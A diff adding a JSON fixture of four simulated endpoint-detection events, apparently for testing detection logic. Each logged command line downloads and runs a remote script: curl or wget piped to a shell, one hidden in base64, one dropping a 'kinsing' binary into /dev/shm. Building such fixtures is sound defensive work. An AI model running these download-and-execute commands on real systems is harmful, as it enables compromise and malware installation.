@@ -1,0 +1,72 @@
+[
+  {
+    "_source": "sentinelone_cloudfunnel",
+    "event": {
+      "category": "process",
+      "type": "Process Creation"
+    },
+    "agent": {
+      "uuid": "55cf574b-9fd7-5278-2ee0-badefd0d2216"
+    },
+    "endpoint": {
+      "name": "web-01",
+      "os": "linux"
+    },
+    "tgt": {
+      "process": {
+        "name": "sh",
+        "cmdline": "sh -c curl -s http://198.51.100.77/x.sh | sh",
+        "image": {
+          "path": "/usr/bin/dash"
+        },
+        "user": "node"
+      }
+    },
+    "src": {
+      "process": {
+        "name": "node"
+      }
+    }
+  },
+  {
+    "_source": "crowdstrike_fdr",
+    "event_simpleName": "ProcessRollup2",
+    "aid": "0123456789abcdef0123456789abcd18",
+    "cid": "fedcba9876543210fedcba9876543210",
+    "event_platform": "Mac",
+    "ComputerName": "MBP-CGREEN",
+    "ImageFileName": "/bin/zsh",
+    "CommandLine": "/bin/zsh -c curl -fsSL https://cleaner.example.net/run.sh | zsh",
+    "ParentBaseFileName": "Script Editor",
+    "RawProcessId": "6612",
+    "UserName": "cgreen"
+  },
+  {
+    "_source": "defender_hunting",
+    "category": "AdvancedHunting-DeviceProcessEvents",
+    "tenantId": "11111111-1111-1111-1111-111111111111",
+    "properties": {
+      "DeviceId": "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
+      "DeviceName": "mbp-bwhite.example.com",
+      "ActionType": "ProcessCreated",
+      "FileName": "bash",
+      "FolderPath": "/bin/bash",
+      "ProcessCommandLine": "/bin/bash -c \"$(echo Y3VybCAtZnNTTCBodHRwOi8vMTk4LjUxLjEwMC43Ny9pLnNoIHwgYmFzaA== | base64 -d)\"",
+      "InitiatingProcessFileName": "zsh",
+      "AccountName": "bwhite"
+    }
+  },
+  {
+    "_source": "crowdstrike_fdr",
+    "event_simpleName": "ProcessRollup2",
+    "aid": "0123456789abcdef0123456789abcd22",
+    "cid": "fedcba9876543210fedcba9876543210",
+    "event_platform": "Lin",
+    "ComputerName": "web-03",
+    "ImageFileName": "/usr/bin/bash",
+    "CommandLine": "bash -c wget -q -O /dev/shm/.x http://203.0.113.77/kinsing && chmod +x /dev/shm/.x && /dev/shm/.x",
+    "ParentBaseFileName": "php-fpm",
+    "RawProcessId": "7001",
+    "UserName": "www-data"
+  }
+]
